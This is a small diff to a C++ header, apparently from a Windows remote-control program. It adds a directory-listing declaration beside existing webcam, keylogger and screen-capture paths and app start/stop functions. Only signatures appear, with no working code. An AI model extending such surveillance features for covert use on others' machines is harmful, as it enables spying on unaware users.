@@ -34,6 +34,7 @@ extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath, reques
 map<string, map<string, function<void()>>> setupHandlers();
 string getFileName(const string& filePath);
 void getInstruction();
+void listDir(const string& dirPath);
 void listApps();
 void startApp(LPWSTR appPath);
 void stopApp(DWORD processID);
